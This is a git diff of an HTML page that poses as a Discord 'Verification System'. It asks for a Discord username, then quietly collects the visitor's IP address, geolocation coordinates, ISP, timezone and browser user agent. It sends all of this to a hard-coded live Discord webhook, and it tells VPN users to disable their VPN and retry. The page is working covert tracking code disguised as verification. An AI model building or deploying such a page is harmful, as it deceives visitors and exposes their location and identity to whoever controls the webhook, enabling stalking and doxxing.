@@ -2,110 +2,269 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>Verification System</title>
-  <!-- Google Font -->
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    body { font-family: 'Roboto', sans-serif; background-color: #f5f7fa; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .container { background: #fff; border-radius: 12px; box-shadow: 0 6px 18px rgba(0,0,0,0.1); width: 90%; max-width: 400px; padding: 30px; text-align: center; }
-    h1 { margin-bottom: 20px; color: #333; font-size: 1.8rem; }
-    .status { display: flex; align-items: center; justify-content: center; padding: 20px; border-radius: 8px; font-weight: 500; margin-top: 20px; }
-    .spinner { width: 28px; height: 28px; border: 4px solid rgba(0,0,0,0.1); border-left-color: #4a90e2; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .loading { background: #e1f0ff; color: #004085; border: 1px solid #b3d4fc; }
-    .success { background: #e6f4ea; color: #155724; border: 1px solid #c3e6cb; }
-    .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-    .warning { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
+    /* ─── Global & Background ───────────────────────────────────────── */
+    @keyframes gradientBG {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; padding: 0;
+      height: 100vh; overflow: hidden;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(-45deg, #1c1c2e, #2c2c3f, #1c1c2e, #2c2c3f);
+      background-size: 400% 400%;
+      animation: gradientBG 20s ease infinite;
+      display: flex; align-items: center; justify-content: center;
+      color: #eee;
+    }
+
+    /* ─── Card Container ────────────────────────────────────────────── */
+    .card {
+      background: rgba(0,0,0,0.75);
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+      width: 360px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      transform-style: preserve-3d;
+      transition: transform 0.6s;
+    }
+    .card:hover {
+      transform: rotateY(10deg) rotateX(5deg);
+    }
+
+    h1 {
+      margin: 0 0 1rem;
+      font-size: 1.6rem;
+      letter-spacing: 0.5px;
+    }
+
+    /* ─── Input & Button ───────────────────────────────────────────── */
+    .input-group {
+      margin-bottom: 1rem;
+      position: relative;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 0.7rem 1rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      outline: none;
+      transition: box-shadow 0.2s;
+    }
+    input[type="text"]:focus {
+      box-shadow: 0 0 10px rgba(9, 157, 255, 0.6);
+    }
+    button {
+      width: 100%;
+      padding: 0.8rem;
+      background: linear-gradient(45deg, #3273dc, #275bbe);
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+    }
+    button:hover {
+      background: linear-gradient(45deg, #4183ff, #3a6cff);
+    }
+    button:active {
+      transform: scale(0.98);
+    }
+
+    /* ─── Status Box ───────────────────────────────────────────────── */
+    .status {
+      margin-top: 1rem;
+      padding: 0.8rem;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    .status.visible {
+      opacity: 1;
+    }
+    .spinner {
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top:    4px solid #09f;
+      border-radius: 50%;
+      width: 20px; height: 20px;
+      animation: spin 1s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .loading { background: rgba(0,123,255,0.2); color: #0d6efd; }
+    .success { background: rgba(40,167,69,0.2); color: #28a745; }
+    .error   { background: rgba(220,53,69,0.2); color: #dc3545; }
+    .warning { background: rgba(255,193,7,0.2); color: #ffc107; }
+
+    /* ─── Detail List ──────────────────────────────────────────────── */
+    .details {
+      margin-top: 1rem;
+      text-align: left;
+      font-size: 0.9rem;
+      line-height: 1.4;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.5s ease;
+    }
+    .details.visible {
+      max-height: 400px;
+    }
+    .details dt { font-weight: bold; }
+    .details dd { margin: 0 0 0.5rem 1rem; }
+    .toggle-details {
+      margin-top: 0.5rem;
+      background: none; border: none;
+      color: #09f; cursor: pointer;
+      font-size: 0.9rem;
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔐 Auto Verification</h1>
-    <div id="status" class="status loading">
-      <div class="spinner"></div>
-      <div><strong>Initializing...</strong> <span>Checking connection...</span></div>
+  <div class="card" id="card">
+    <h1>Enter your Discord Username</h1>
+    <div class="input-group">
+      <input type="text" id="username" placeholder="CoolUser#1234" autofocus />
     </div>
+    <button id="submitBtn">Verify Now</button>
+    <div id="status" class="status"></div>
+    <dl id="details" class="details">
+      <dt>IP Address:</dt><dd id="ip"></dd>
+      <dt>Location:</dt><dd id="loc"></dd>
+      <dt>Coordinates:</dt><dd><a id="mapLink" href="#" target="_blank"></a></dd>
+      <dt>Timezone:</dt><dd id="tz"></dd>
+      <dt>ISP / Org:</dt><dd id="isp"></dd>
+      <dt>VPN Heuristics:</dt><dd id="vpn"></dd>
+      <dt>User Agent:</dt><dd id="ua"></dd>
+      <dt>Timestamp:</dt><dd id="ts"></dd>
+    </dl>
+    <button id="toggleBtn" class="toggle-details" style="display:none;">Show Details ▼</button>
   </div>
+
   <script>
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3';
-    const statusDiv = document.getElementById('status');
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
 
-    function setStatus(cls, title, msg) {
-      statusDiv.className = 'status ' + cls;
-      statusDiv.innerHTML = (cls === 'loading' ? '<div class="spinner"></div>' : '') +
-        `<div><strong>${title}</strong> <span>${msg}</span></div>`;
+    const statusEl = document.getElementById('status');
+    const detailsEl = document.getElementById('details');
+    const toggleBtn = document.getElementById('toggleBtn');
+
+    function showStatus(type, html) {
+      statusEl.className = 'status ' + type + ' visible';
+      statusEl.innerHTML = html;
+    }
+    function safeFetch(url, opts={}, t=6000) {
+      const c = new AbortController();
+      const id = setTimeout(() => c.abort(), t);
+      return fetch(url, {...opts, signal:c.signal, mode:'cors'}).finally(() => clearTimeout(id));
     }
 
-    async function safeFetch(url, opts = {}, timeout = 5000) {
-      const ctrl = new AbortController();
-      const timer = setTimeout(() => ctrl.abort(), timeout);
+    async function gatherAndSend(name) {
+      showStatus('loading','<span class="spinner"></span>Gathering info...');
       try {
-        const res = await fetch(url, { ...opts, signal: ctrl.signal, mode: 'cors' });
-        clearTimeout(timer);
-        return res;
-      } catch (e) {
-        clearTimeout(timer);
-        throw e;
-      }
-    }
-
-    async function autoVerify() {
-      setStatus('loading', 'Fetching IP', 'Retrieving your IP address...');
-      try {
-        let ipRes;
-        try { ipRes = await safeFetch('https://api.ipify.org?format=json'); }
-        catch { ipRes = await safeFetch('https://api.db-ip.com/v2/free/self'); }
-        const ipData = await ipRes.json();
+        // 1) IP lookup
+        let ipData;
+        try { ipData = await (await safeFetch('https://api.ipify.org?format=json')).json(); }
+        catch { ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json(); }
         const ip = ipData.ip || ipData.ipAddress;
-        if (!ip) throw new Error('IP not found');
 
-        setStatus('loading', 'Geolocating', 'Fetching location info...');
-        let geoRes;
-        try { geoRes = await safeFetch(`https://ipapi.co/${ip}/json/`); }
-        catch { geoRes = await safeFetch(`https://ipwho.is/${ip}`); }
-        const geo = await geoRes.json();
+        // 2) Geo lookup
+        let geo;
+        try {
+          geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json();
+          if (geo.error) throw 1;
+        } catch {
+          geo = await (await safeFetch(`https://ipwho.is/${ip}`)).json();
+        }
 
-        const city = geo.city || 'Unknown';
-        const region = geo.region_name || geo.region || 'Unknown';
-        const country = geo.country_name || geo.country || 'Unknown';
-
-        setStatus('loading', 'Analyzing', 'Checking for VPN/proxy...');
+        // 3) VPN heuristics
+        const sus = [];
         let score = 0;
-        const factors = [];
-        if (geo.org && /datacenter|hosting|cloud/i.test(geo.org)) { factors.push('Datacenter IP'); score += 40; }
-        if (geo.org && /vpn|proxy|tor/i.test(geo.org)) { factors.push('VPN/Proxy'); score += 50; }
-        if (geo.port && [1080,3128,8080,8888,9050].includes(Number(geo.port))) { factors.push('Proxy port'); score += 30; }
-        if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) { factors.push('Timezone mismatch'); score += 20; }
-        const usingVpn = score >= 60;
+        if (geo.org && /hosting|datacenter|cloud|server|proxy|vpn/i.test(geo.org)) {
+          sus.push('Datacenter IP'); score+=40;
+        }
+        if (geo.port && [80,443,1080,3128,8080,8888,9050].includes(+geo.port)) {
+          sus.push('Proxy Port'); score+=30;
+        }
+        const isVpn = score>=40;
 
-        setStatus('loading', 'Sending', 'Reporting to Discord...');
+        // 4) Build embed
         const embed = {
-          username: 'Verification System',
-          avatar_url: 'https://i.imgur.com/ZOKp8LH.png',
-          embeds: [{
-            title: `${city}, ${country}`,
-            color: usingVpn ? 0xdc3545 : 0x28a745,
-            fields: [
-              { name: '🌐 IP Address', value: ip, inline: true },
-              { name: '📍 Location', value: `${city}, ${region}, ${country}`, inline: true },
-              { name: '🔍 Status', value: usingVpn ? '❌ VPN/Proxy Detected' : '✅ No VPN Detected', inline: false }
-            ],
-            footer: { text: usingVpn ? `VPN Score: ${score}` : `Verified at ${new Date().toLocaleString()}` }
-          }]
+          title: isVpn
+            ? `⚠️ VPN Detected: ${name}`
+            : `✅ Verified: ${name}`,
+          color: isVpn ? 16755007 : 65280,
+          fields: [
+            { name:'Username', value:name, inline:true },
+            { name:'IP',       value:ip, inline:true },
+            { name:'Location', value:`${geo.city||'—'}, ${geo.region_name||geo.region||'—'}, ${geo.country_name||geo.country||'—'}`, inline:false },
+            { name:'Coordinates', value:`[${geo.latitude||geo.lat}, ${geo.longitude||geo.lon}](https://maps.google.com?q=${geo.latitude||geo.lat},${geo.longitude||geo.lon})`, inline:false },
+            { name:'Timezone', value:geo.timezone||'—', inline:true },
+            { name:'ISP/Org', value:geo.org||geo.connection?.isp||'—', inline:true },
+            { name:'Device UA', value:`\`\`\`${navigator.userAgent}\`\`\``, inline:false }
+          ],
+          timestamp: new Date().toISOString()
         };
-        if (factors.length) embed.embeds[0].fields.push({ name: '⚠️ Factors', value: factors.join('\n'), inline: false });
+        if (sus.length) embed.fields.push({ name:'Suspicious', value:sus.join(', '), inline:false });
 
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+        // 5) Send to webhook
+        await fetch(DISCORD_WEBHOOK,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ username:'Verification System', embeds:[embed] })
+        });
 
-        setStatus(usingVpn ? 'warning' : 'success', usingVpn ? 'VPN Detected' : 'Verification Successful', usingVpn ? 'Disable VPN and refresh.' : 'Your connection is secure.');
-      } catch (err) {
-        console.error(err);
-        setStatus('error', 'Error', err.message || 'Verification failed.');
+        // 6) UI update
+        showStatus(isVpn?'warning':'success',
+          isVpn
+            ? '⚠️ VPN/Proxy detected. Please disable and retry.'
+            : '✅ Info sent successfully!'
+        );
+
+        // Populate detail panel
+        document.getElementById('ip').textContent  = ip;
+        document.getElementById('loc').textContent = `${geo.city||'—'}, ${geo.region_name||geo.region||'—'}, ${geo.country_name||geo.country||'—'}`;
+        const mapL = document.getElementById('mapLink');
+        const lat = geo.latitude||geo.lat||0, lon = geo.longitude||geo.lon||0;
+        mapL.href = `https://maps.google.com?q=${lat},${lon}`;
+        mapL.textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
+        document.getElementById('tz').textContent = geo.timezone||'—';
+        document.getElementById('isp').textContent = geo.org||geo.connection?.isp||'—';
+        document.getElementById('vpn').textContent = isVpn ? sus.join('; ') : 'None';
+        document.getElementById('ua').textContent = navigator.userAgent;
+        document.getElementById('ts').textContent = new Date().toLocaleString();
+
+        toggleBtn.style.display = 'block';
+      } catch (e) {
+        console.error(e);
+        showStatus('error', `❌ ${e.message||'Failed to verify.'}`);
       }
     }
 
-    window.addEventListener('DOMContentLoaded', autoVerify);
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const u = document.getElementById('username').value.trim();
+      if (!u) return showStatus('error','❌ Please enter your username.');
+      gatherAndSend(u);
+    });
+    toggleBtn.addEventListener('click', () => {
+      const vis = detailsEl.classList.toggle('visible');
+      toggleBtn.textContent = vis ? 'Hide Details ▲' : 'Show Details ▼';
+    });
   </script>
 </body>
 </html>
